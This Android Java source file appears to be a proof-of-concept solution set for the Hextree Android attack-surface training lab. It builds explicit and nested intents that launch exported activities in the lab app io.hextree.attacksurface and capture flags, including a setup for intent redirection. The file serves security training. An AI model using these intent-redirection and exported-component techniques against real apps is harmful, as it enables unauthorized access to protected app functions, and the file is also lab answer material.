package com.poc.hextree;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import org.w3c.dom.Text;

public class MainActivity extends AppCompatActivity {

    public String packageName = "io.hextree.attacksurface";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        TextView homeText = findViewById(R.id.home_text);
        homeText.setText("welcome from code !!!");

        Button homeButton = findViewById(R.id.button);
        homeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                homeText.setText(" text changes after button click");
                flag5Solution();
            }
        });
    }

    private void flag1Solution(){
//        basic exported activity
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag1Activity"));
        Log.i("first intent", "solution flag 1");
        startActivity(intent);

    }

    private void flag2Solution(){
//        Intent with extras ie action
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag2Activity"));
        Log.i("first intent", "solution flag 2");
        startActivity(intent);
    }

    private  void flag3Solution(){
//        extra data with datauri set
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag3Activity"));
        intent.setData(Uri.parse("https://app.hextree.io/map/android"));
        Log.i("first intent", "solution flag 3");
        startActivity(intent);
    }

    private void flag5Solution(){
//        Intent in Intent: prequel to Intent redirection
        Intent intent3 = new Intent();
        intent3.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
        intent3.putExtra("reason","back");

        Intent intent2 = new Intent();
        intent2.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
        intent2.putExtra("nextIntent", intent3);


        Intent intent = new Intent();
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
        intent.putExtra("android.intent.extra.INTENT",intent2);
        startActivity(intent);

    }
}